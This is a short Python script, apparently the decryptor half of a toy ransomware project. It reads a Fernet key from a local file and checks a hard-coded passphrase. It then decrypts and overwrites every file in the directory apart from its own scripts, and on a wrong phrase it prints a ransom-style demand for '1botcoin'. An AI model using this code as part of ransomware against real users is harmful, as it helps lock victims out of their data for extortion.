import os
from cryptography.fernet import Fernet
from colorama import Fore,Style,init

#Autoresseting the coloring in the colorama
init(autoreset=True)

files = []

for file in os.listdir():
    if file == "main.py" or file == "decrypt.py" or file=="key.key":
        continue
    else:
        if os.path.isfile(file):
            files.append(file)

with open("key.key",'rb') as thekey:
    key = thekey.read()

secret_phrase = "programmer"
user_phrase = input(f"{Fore.YELLOW}Enter the phrase that I have given to you:")

if secret_phrase == user_phrase:
    for file in files:
        with open(file,'rb') as thefile:
            content = thefile.read()
            decrypted_content = Fernet(key).decrypt(content)
        with open(file,'wb') as thefile:
            thefile.write(decrypted_content)
    print(f"{Fore.GREEN}All your files have been recovered")
else:
    print(f"{Fore.RED}Invalid phrase now give me 1botcoin more!!")